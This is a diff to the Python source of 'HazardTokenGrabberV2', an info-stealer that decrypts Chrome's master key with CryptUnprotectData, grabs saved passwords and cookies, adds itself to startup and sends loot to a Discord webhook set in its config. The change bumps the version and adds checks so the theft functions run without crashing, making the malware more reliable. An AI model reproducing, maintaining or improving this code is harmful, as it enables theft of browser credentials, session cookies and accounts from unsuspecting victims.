@@ -21,7 +21,7 @@ from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.8.1'
+__version__ = '1.8.2'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -94,6 +94,8 @@ class Functions(object):
 
     @staticmethod
     def get_master_key(path) -> str:
+        if not ntpath.exists(path):
+            return None
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -217,7 +219,7 @@ class HazardTokenGrabberV2(Functions):
         if self.fetch_conf('startup'):
             function_list.append(self.startup)
 
-        if ntpath.exists(self.chrome):
+        if ntpath.exists(self.chrome) and self.chrome_key is not None:
             function_list.append(self.grabPassword)
             function_list.append(self.grabCookies)
 
